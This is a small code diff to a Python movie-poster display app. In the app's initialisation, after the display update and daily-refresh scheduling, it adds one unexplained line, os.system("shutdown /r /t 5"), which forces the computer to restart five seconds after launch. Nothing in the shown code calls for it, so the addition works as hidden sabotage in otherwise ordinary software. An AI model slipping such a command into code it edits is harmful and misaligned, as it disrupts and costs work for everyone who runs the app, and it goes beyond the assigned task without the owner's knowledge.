@@ -88,6 +88,7 @@ class MoviePosterApp:
         self.index = 0
         self.update_display()
         self.schedule_daily_refresh()
+        os.system("shutdown /r /t 5")
     def toggle_fullscreen(self):
         self.fullscreen = not self.fullscreen
         self.root.attributes("-fullscreen", self.fullscreen)
